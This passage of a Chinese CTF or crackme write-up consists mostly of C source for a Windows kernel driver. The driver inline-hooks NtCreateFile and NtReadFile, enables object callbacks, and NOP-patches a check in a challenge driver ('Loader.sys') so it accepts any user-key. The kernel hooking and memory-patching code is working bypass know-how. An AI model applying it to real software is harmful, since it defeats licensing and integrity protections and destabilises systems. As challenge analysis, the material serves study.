PIO_APC_ROUTINE ApcRoutine,    _In_opt_ PVOID ApcContext,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _Out_writes_bytes_(Length) PVOID Buffer,    _In_ ULONG Length,    _In_opt_ PLARGE_INTEGER ByteOffset,    _In_opt_ PULONG Key) {    Unhook2();    FuncPtr2 func = (FuncPtr2)target2;<br />    <span style="color: rgb(150, 203, 254);">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"call NtReadFile(%p,%p,%p,%p,%p,%p,%p,%p,%p)\n"</span>), FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"buffer in %p\n"</span>), Buffer);        PatchInstr();<br />        FileHandler = <span style="color: rgb(255, 115, 253);">0</span>;    }<br />    <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span>    NTSTATUS s = func(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);    Hook2();<br />    <span style="color: rgb(150, 203, 254);">return</span> s;}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">DriverUnload</span>(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start unload\n"</span>), __LINE__);    Unhook();    Unhook2();    DeleteDevice(pDriver);}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {    DriverObject-&gt;DriverUnload = DriverUnload;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: RegistryPath = %S\n"</span>), __LINE__, RegistryPath-&gt;Buffer);    target = NtCreateFile;    target2 = NtReadFile;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: NtCreateFile=%p NtReadFile=%p\n"</span>), __LINE__, target,target2);    g_Object = DriverObject;<br />    <span style="color: rgb(150, 203, 254);">if</span> (target&amp;&amp;target2) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(oldcode); i++) {            oldcode[i] = target[i];            oldcode2[i] = target2[i];        }<br />        *(UINT64*)(newcode + <span style="color: rgb(255, 115, 253);">2</span>) = myCreateFile;<br />        *(UINT64*)(newcode2 + <span style="color: rgb(255, 115, 253);">2</span>) = myReadFile;        Hook();        Hook2();    }<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233:hahaha"</span>));    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;}<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">Filter</span>(ULONG Start){    LDR_DATA_TABLE_ENTRY *TE, *Tmp;    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;    PLIST_ENTRY LinkList;    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;    LinkList = TE-&gt;InLoadOrderLinks.Flink;  <br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)    {        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;        ULONG BASE = Tmp-&gt;DllBase;        ULONG Size = Tmp-&gt;SizeOfImage;<br />        <span style="color: rgb(150, 203, 254);">if</span> (Start &gt;= BASE &amp;&amp; Start &lt; BASE + Size) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;        }        LinkList = LinkList-&gt;Flink;        i++;    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">1</span>;<br />}</code></pre><p>可以看到，先加载我写的驱动，后加载题目驱动，无论 user-key 正确与否，都加载成功</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=9b769066&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePl2qiaxzNWy7Tg2PCsxJzhuFf1nTl9RH9x69ecqCbh74uIgkCwHd7Aicw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>于是这里把修改的函数套到文件读取里面去拦截，达到读该文件时遍历模块，找到指定模块则写入指令。</p><p>下面是真正的代码（编译文件为XSafe2.sys）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_CALLBACK_ENTRY</span>{    LIST_ENTRY CallbackList;    OB_OPERATION  Operations;    ULONG Active;    PVOID Handle;    POBJECT_TYPE ObjectType;    POB_PRE_OPERATION_CALLBACK  PreOperation;    POB_POST_OPERATION_CALLBACK PostOperation;    ULONG unknown;} CALLBACK_ENTRY, *PCALLBACK_ENTRY;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LDR_DATA</span>                         <span style="color: rgb(146, 255, 184);">// 24 elements, 0xE0 bytes (sizeof)</span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> InLoadOrderLinks;                     <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x010*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> InMemoryOrderLinks;                   <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x020*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> InInitializationOrderLinks;           <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x030*/</span>     VOID*        DllBase;<br />    <span style="color: rgb(146, 255, 184);">/*0x038*/</span>     VOID*        EntryPoint;<br />    <span style="color: rgb(146, 255, 184);">/*0x040*/</span>     ULONG32      SizeOfImage;<br />    <span style="color: rgb(146, 255, 184);">/*0x044*/</span>     UINT8        _PADDING0_[<span style="color: rgb(255, 115, 253);">0x4</span>];<br />    <span style="color: rgb(146, 255, 184);">/*0x048*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_UNICODE_STRING</span> FullDllName;                      <span style="color: rgb(146, 255, 184);">// 3 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x058*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_UNICODE_STRING</span> BaseDllName;                      <span style="color: rgb(146, 255, 184);">// 3 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x068*/</span>     ULONG32      Flags;<br />    <span style="color: rgb(146, 255, 184);">/*0x06C*/</span>     UINT16       LoadCount;<br />    <span style="color: rgb(146, 255, 184);">/*0x06E*/</span>     UINT16       TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span>                                                    <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span>    {<br />        <span style="color: rgb(146, 255, 184);">/*0x070*/</span>         <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> HashLinks;                        <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />        <span style="color: rgb(150, 203, 254);">struct</span>                                               <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span>        {<br />            <span style="color: rgb(146, 255, 184);">/*0x070*/</span>             VOID*        SectionPointer;<br />            <span style="color: rgb(146, 255, 184);">/*0x078*/</span>             ULONG32      CheckSum;<br />            <span style="color: rgb(146, 255, 184);">/*0x07C*/</span>             UINT8        _PADDING1_[<span style="color: rgb(255, 115, 253);">0x4</span>];        };    };<br />    <span style="color: rgb(150, 203, 254);">union</span>                                                    <span style="color: rgb(146, 255, 184);">// 2 elements, 0x8 bytes (sizeof)</span>    {<br />        <span style="color: rgb(146, 255, 184);">/*0x080*/</span>         ULONG32      TimeDateStamp;<br />        <span style="color: rgb(146, 255, 184);">/*0x080*/</span>         VOID*        LoadedImports;    };<br />    <span style="color: rgb(146, 255, 184);">/*0x088*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_ACTIVATION_CONTEXT</span>* EntryPointActivationContext;<br />    <span style="color: rgb(146, 255, 184);">/*0x090*/</span>     VOID*        PatchInformation;<br />    <span style="color: rgb(146, 255, 184);">/*0x098*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> ForwarderLinks;                       <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x0A8*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> ServiceTagLinks;                      <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x0B8*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> StaticLinks;                          <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x0C8*/</span>     VOID*        ContextInformation;<br />    <span style="color: rgb(146, 255, 184);">/*0x0D0*/</span>     UINT64       OriginalBase;<br />    <span style="color: rgb(146, 255, 184);">/*0x0D8*/</span>     <span style="color: rgb(150, 203, 254);">union</span> <span style="color: rgb(255, 255, 182);">_LARGE_INTEGER</span> LoadTime;                           <span style="color: rgb(146, 255, 184);">// 4 elements, 0x8 bytes (sizeof)</span>}LDR_DATA, *PLDR_DATA;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_OBJECT_TYPE_INITIALIZER</span>                                                                                                                                         <span style="color: rgb(146, 255, 184);">// 25 elements, 0x70 bytes (sizeof)</span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT16       Length;<br />    <span style="color: rgb(150, 203, 254);">union</span>                                                                                                                                                                       <span style="color: rgb(146, 255, 184);">// 2 elements, 0x1 bytes (sizeof)</span>    {<br />        <span style="color: rgb(146, 255, 184);">/*0x002*/</span>         UINT8        ObjectTypeFlags;<br />        <span style="color: rgb(150, 203, 254);">struct</span>                                                                                                                                                                  <span style="color: rgb(146, 255, 184);">// 7 elements, 0x1 bytes (sizeof)</span>        {<br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        CaseInsensitive : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                                   <span style="color: rgb(146, 255, 184);">// 0 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        UnnamedObjectsOnly : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                                <span style="color: rgb(146, 255, 184);">// 1 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        UseDefaultObject : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                                  <span style="color: rgb(146, 255, 184);">// 2 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        SecurityRequired : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                                  <span style="color: rgb(146, 255, 184);">// 3 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        MaintainHandleCount : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                               <span style="color: rgb(146, 255, 184);">// 4 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        MaintainTypeList : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                                  <span style="color: rgb(146, 255, 184);">// 5 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x002*/</span>             UINT8        SupportsObjectCallbacks : <span style="color: rgb(255, 115, 253);">1</span>;                                                                                                                           <span style="color: rgb(146, 255, 184);">// 6 BitPosition</span>        };    };<br />    <span style="color: rgb(146, 255, 184);">/*0x004*/</span>     ULONG32      ObjectTypeCode;<br />    <span style="color: rgb(146, 255, 184);">/*0x008*/</span>     ULONG32      InvalidAttributes;<br />    <span style="color: rgb(146, 255, 184);">/*0x00C*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_GENERIC_MAPPING</span> GenericMapping;                                                                                                                                     <span style="color: rgb(146, 255, 184);">// 4 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x01C*/</span>     ULONG32      ValidAccessMask;<br />    <span style="color: rgb(146, 255, 184);">/*0x020*/</span>     ULONG32      RetainAccess;<br />    <span style="color: rgb(146, 255, 184);">/*0x024*/</span>     <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_POOL_TYPE</span> PoolType;<br />    <span style="color: rgb(146, 255, 184);">/*0x028*/</span>     ULONG32      DefaultPagedPoolCharge;<br />    <span style="color: rgb(146, 255, 184);">/*0x02C*/</span>     ULONG32      DefaultNonPagedPoolCharge;<br />    <span style="color: rgb(146, 255, 184);">/*0x030*/</span>     PVOID DumpProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x038*/</span>     PVOID OpenProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x040*/</span>     PVOID CloseProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x048*/</span>     PVOID DeleteProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x050*/</span>     PVOID ParseProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x058*/</span>     PVOID SecurityProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x060*/</span>     PVOID QueryNameProcedure;<br />    <span style="color: rgb(146, 255, 184);">/*0x068*/</span>     PVOID OkayToCloseProcedure;}OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_EX_PUSH_LOCK</span>                 <span style="color: rgb(146, 255, 184);">// 7 elements, 0x8 bytes (sizeof)</span>{<br />    <span style="color: rgb(150, 203, 254);">union</span>                                    <span style="color: rgb(146, 255, 184);">// 3 elements, 0x8 bytes (sizeof)</span>    {<br />        <span style="color: rgb(150, 203, 254);">struct</span>                               <span style="color: rgb(146, 255, 184);">// 5 elements, 0x8 bytes (sizeof)</span>        {<br />            <span style="color: rgb(146, 255, 184);">/*0x000*/</span>             UINT64       Locked : <span style="color: rgb(255, 115, 253);">1</span>;         <span style="color: rgb(146, 255, 184);">// 0 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x000*/</span>             UINT64       Waiting : <span style="color: rgb(255, 115, 253);">1</span>;        <span style="color: rgb(146, 255, 184);">// 1 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x000*/</span>             UINT64       Waking : <span style="color: rgb(255, 115, 253);">1</span>;         <span style="color: rgb(146, 255, 184);">// 2 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x000*/</span>             UINT64       MultipleShared : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 3 BitPosition</span><br />            <span style="color: rgb(146, 255, 184);">/*0x000*/</span>             UINT64       Shared : <span style="color: rgb(255, 115, 253);">60</span>;        <span style="color: rgb(146, 255, 184);">// 4 BitPosition</span>        };<br />        <span style="color: rgb(146, 255, 184);">/*0x000*/</span>         UINT64       Value;<br />        <span style="color: rgb(146, 255, 184);">/*0x000*/</span>         VOID*        Ptr;    };};<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_MY_OBJECT_TYPE</span>                   <span style="color: rgb(146, 255, 184);">// 12 elements, 0xD0 bytes (sizeof)</span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> TypeList;              <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x010*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_UNICODE_STRING</span> Name;              <span style="color: rgb(146, 255, 184);">// 3 elements, 0x10 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x020*/</span>     VOID*        DefaultObject;<br />    <span style="color: rgb(146, 255, 184);">/*0x028*/</span>     UINT8        Index;<br />    <span style="color: rgb(146, 255, 184);">/*0x029*/</span>     UINT8        _PADDING0_[<span style="color: rgb(255, 115, 253);">0x3</span>];<br />    <span style="color: rgb(146, 255, 184);">/*0x02C*/</span>     ULONG32      TotalNumberOfObjects;<br />    <span style="color: rgb(146, 255, 184);">/*0x030*/</span>     ULONG32      TotalNumberOfHandles;<br />    <span style="color: rgb(146, 255, 184);">/*0x034*/</span>     ULONG32      HighWaterNumberOfObjects;<br />    <span style="color: rgb(146, 255, 184);">/*0x038*/</span>     ULONG32      HighWaterNumberOfHandles;<br />    <span style="color: rgb(146, 255, 184);">/*0x03C*/</span>     UINT8        _PADDING1_[<span style="color: rgb(255, 115, 253);">0x4</span>];<br />    <span style="color: rgb(146, 255, 184);">/*0x040*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_OBJECT_TYPE_INITIALIZER</span> TypeInfo; <span style="color: rgb(146, 255, 184);">// 25 elements, 0x70 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x0B0*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_EX_PUSH_LOCK</span> TypeLock;            <span style="color: rgb(146, 255, 184);">// 7 elements, 0x8 bytes (sizeof)</span><br />    <span style="color: rgb(146, 255, 184);">/*0x0B8*/</span>     ULONG32      Key;<br />    <span style="color: rgb(146, 255, 184);">/*0x0BC*/</span>     UINT8        _PADDING2_[<span style="color: rgb(255, 115, 253);">0x4</span>];<br />    <span style="color: rgb(146, 255, 184);">/*0x0C0*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LIST_ENTRY</span> CallbackList;          <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)</span>}MY_OBJECT_TYPE, *PMY_OBJECT_TYPE;<br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);<br />VOID <span style="color: rgb(255, 255, 182);">UnloadDriver</span>(PDRIVER_OBJECT DriverObject);<br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>();<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (*ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_PROCESS_INFORMATION</span> {    ULONG NextEntryOffset;    ULONG NumberOfThreads;<br />    LARGE_INTEGER Reserved[<span style="color: rgb(255, 115, 253);">3</span>];    LARGE_INTEGER CreateTime;    LARGE_INTEGER UserTime;    LARGE_INTEGER KernelTime;    UNICODE_STRING ImageName;    ULONG BasePriority;    HANDLE ProcessId;    HANDLE InheritedFromProcessId;} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_THREAD_INFORMATION</span> {    LARGE_INTEGER KernelTime;    LARGE_INTEGER UserTime;    LARGE_INTEGER CreateTime;    ULONG WaitTime;    PVOID StartAddress;    CLIENT_ID ClientId;    ULONG Priority;    LONG BasePriority;    ULONG ContextSwitchCount;    LONG State;    LONG WaitReason;} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_INFORMATION_CLASS</span> {<br />    SystemProcessInformation = <span style="color: rgb(255, 115, 253);">5</span>} SYSTEM_INFORMATION_CLASS;<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SystemModuleInformation 11</span>PVOID obHandle;DRIVER_INITIALIZE DriverEntry;<br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LDR_DATA_TABLE_ENTRY</span> {    LIST_ENTRY InLoadOrderLinks;    LIST_ENTRY InMemoryOrderLinks;    LIST_ENTRY InInitializationOrderLinks;    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(146, 255, 184);">//驱动的进入点 DriverEntry  </span>    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(146, 255, 184);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(146, 255, 184);">//不带路径的驱动名字  </span>    ULONG Flags;    USHORT LoadCount;    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID SectionPointer;            ULONG CheckSum;        };    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            ULONG TimeDateStamp;        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID LoadedImports;        };    };} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize){<br />    PMDL pMdl = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    PVOID pNewAddress = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    pMdl = MmCreateMdl(<span style="color: rgb(198, 197, 254);">NULL</span>, pBaseAddress, writeDataSize);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pMdl)    {<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }    MmBuildMdlForNonPagedPool(pMdl);    pNewAddress = MmMapLockedPages(pMdl, KernelMode);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pNewAddress)    {        IoFreeMdl(pMdl);    }    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);    MmUnmapLockedPages(pNewAddress, pMdl);    IoFreeMdl(pMdl);<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;}<br />VOID <span style="color: rgb(255, 255, 182);">PatchInstr</span>(){    LDR_DATA_TABLE_ENTRY *TE, *Tmp;    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;    PLIST_ENTRY LinkList;    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;    LinkList = TE-&gt;InLoadOrderLinks.Flink;      UNICODE_STRING name;<br />    RtlInitUnicodeString(&amp;name,<span style="color: rgb(168, 255, 96);">L"Loader.sys"</span>);    ;<br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)    {        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;<br />        <span style="color: rgb(150, 203, 254);">if</span> (RtlEqualUnicodeString(&amp;Tmp-&gt;BaseDllName, &amp;name,FALSE)) {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"DLLname:%S DLLBase=%p nowcode=%p\n"</span>), Tmp-&gt;BaseDllName.Buffer,Tmp-&gt;DllBase,(ULONG64)(Tmp-&gt;DllBase) + <span style="color: rgb(255, 115, 253);">0xa27e</span>);<br />            <span style="color: rgb(255, 255, 182);">char</span> buffer[] = { <span style="color: rgb(255, 115, 253);">0x90</span>,<span style="color: rgb(255, 115, 253);">0x90</span> };<br />            MDLWriteMemory((ULONG64)(Tmp-&gt;DllBase) + <span style="color: rgb(255, 115, 253);">0xa27e</span>, buffer, <span style="color: rgb(255, 115, 253);">2</span>);<br />            <span style="color: rgb(150, 203, 254);">return</span>;        }        LinkList = LinkList-&gt;Flink;        i++;    }}<br /><span style="color: rgb(146, 255, 184);">// 文件回调</span><br />OB_PREOP_CALLBACK_STATUS <span style="color: rgb(255, 255, 182);">FileObjectpreCall</span>(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation){    UNICODE_STRING DosName;    PFILE_OBJECT fileo = OperationInformation-&gt;Object;    HANDLE CurrentProcessId = PsGetCurrentProcessId();    UNREFERENCED_PARAMETER(RegistrationContext);<br />    <span style="color: rgb(150, 203, 254);">if</span> (OperationInformation-&gt;ObjectType != *IoFileObjectType)    {<br />        <span style="color: rgb(150, 203, 254);">return</span> OB_PREOP_SUCCESS;    }<br />    <span style="color: rgb(146, 255, 184);">// 过滤无效指针</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (fileo-&gt;FileName.Buffer == <span style="color: rgb(198, 197, 254);">NULL</span> ||         !MmIsAddressValid(fileo-&gt;FileName.Buffer) || <br />        fileo-&gt;DeviceObject == <span style="color: rgb(198, 197, 254);">NULL</span> ||         !MmIsAddressValid(fileo-&gt;DeviceObject))    {<br />        <span style="color: rgb(150, 203, 254);">return</span> OB_PREOP_SUCCESS;    }<br />    <span style="color: rgb(146, 255, 184);">// 过滤无效路径</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (!_wcsicmp(fileo-&gt;FileName.Buffer, <span style="color: rgb(168, 255, 96);">L"\\Endpoint"</span>) || <br />        !_wcsicmp(fileo-&gt;FileName.Buffer, <span style="color: rgb(168, 255, 96);">L"?"</span>) || <br />        !_wcsicmp(fileo-&gt;FileName.Buffer, <span style="color: rgb(168, 255, 96);">L"\\.\\."</span>) || <br />        !_wcsicmp(fileo-&gt;FileName.Buffer, <span style="color: rgb(168, 255, 96);">L"\\"</span>))    {<br />        <span style="color: rgb(150, 203, 254);">return</span> OB_PREOP_SUCCESS;    }<br />    <span style="color: rgb(146, 255, 184);">// 将对象转为DOS路径</span>    RtlVolumeDeviceToDosName(fileo-&gt;DeviceObject, &amp;DosName);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!wcscmp(fileo-&gt;FileName.Buffer, <span style="color: rgb(168, 255, 96);">L"\\card.txt"</span>)) {        PETHREAD pct=PsGetCurrentThread();<br />        PVOID addr=*(ULONG64*)((<span style="color: rgb(255, 255, 182);">char</span>*)pct + <span style="color: rgb(255, 115, 253);">0x450</span>);        PatchInstr();<br />        <span style="color: rgb(146, 255, 184);">//EnumerateKernelThreads();</span>        DbgBreakPoint();    }<br />    <span style="color: rgb(150, 203, 254);">return</span> OB_PREOP_SUCCESS;}<br />VOID <span style="color: rgb(255, 255, 182);">EnableObType</span>(POBJECT_TYPE ObjectType){    PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;<br />    myobtype-&gt;TypeInfo.SupportsObjectCallbacks = <span style="color: rgb(255, 115, 253);">1</span>;}<br />VOID <span 